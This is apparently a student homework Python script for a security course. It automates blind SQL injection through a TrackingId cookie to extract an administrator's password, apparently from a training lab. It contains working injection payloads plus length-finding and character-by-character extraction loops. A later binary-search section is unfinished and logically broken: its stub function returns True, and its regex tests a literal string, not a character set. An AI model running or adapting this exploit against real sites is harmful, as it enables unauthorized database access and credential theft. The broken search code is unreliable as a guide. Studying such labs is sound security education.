# Maksim Semchuk
# CS 495 Homework #2


# Needed Imports:
import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time
import string

# Functions:

# Step 4: Inital Program:
def try_query(query):
    print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False

# This takes in a url (to the site),
# A prefix, that is already know, if any.
# a letter that is being tested to see if it exists inside of the password.
def test_string(url, prefix, letter):
    #query is what is going to be passed in as a regex argument along with the cookie.,
    query = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{prefix}{letter}'--"
    print(f'\nTesting: ^{prefix}{letter}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query)}

    # Now to test it:
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')

    if soup.find('div', text='Welcome back!'):
        print(f'Found Character {letter}')
        return True
    else:
        return False

# Step 6: Find the password Length:
def find_password_length():
    # Step 6: Find the password Length:
    begin_time = time.perf_counter()
    num = 1
    while True:
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        print(f'Trying length {num}')
        if try_query(query) == False:
            num = num + 1
        else:
            break
    print(f"Password length is {num}")
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return num

# Step 8: Linear Search:
def linear_search():
    start_alpha = string.ascii_lowercase + string.digits
    prefix = ''
    begin_time = time.perf_counter()
    while True:
        # Test if the current prefix IS the exact password.
        if test_string(url, prefix, '$'):
            break
        # Otherwise, go through the letter list
        for letter in start_alpha:
            check = test_string(url, prefix, letter)
            if check:
                prefix += letter
                break
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return prefix

def recursive_binary_search(substring, middle_seperator_of_valid_character_set, administrator_password):
    print(f"Substring: {substring}")
    print(f"Middle Seperator: {middle_seperator_of_valid_character_set}")
    print(f"administrator_password: {administrator_password}")
    return True
    


def binary_search(url):
    valid_character_set = string.ascii_lowercase + string.digits
    print(valid_character_set)
    administrator_password = ''
    incomplete_password = True  # Flag, to keep the program going until a whole password is found, which is set by finding a exact match
    middle_seperator_of_valid_character_set = len(valid_character_set) // 2

    query_left = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{valid_character_set[:middle_seperator_of_valid_character_set]}'--"
    query_right = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{valid_character_set[middle_seperator_of_valid_character_set:]}'--"
    if try_query(query_left):
        administrator_password = recursive_binary_search(valid_character_set[:middle_seperator_of_valid_character_set], len(valid_character_set[:middle_seperator_of_valid_character_set]), administrator_password)
    elif try_query(query_right):
        administrator_password = recursive_binary_search(valid_character_set[middle_seperator_of_valid_character_set:], len(valid_character_set[:middle_seperator_of_valid_character_set:]), administrator_password)
    else:
        print("Error occured, no substring is correct")

# To clean things up
if __name__ == "__main__":
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')

    url = f'https://{site}/'

    # Step #6: Password Length:
    # password_length = find_password_length()

    # Step #8: Linear Password search:
    # reference_password = linear_search()
    # print(f"Password reference password is {reference_password}")

    # Step #11: Binary Search:
    binary_search(url)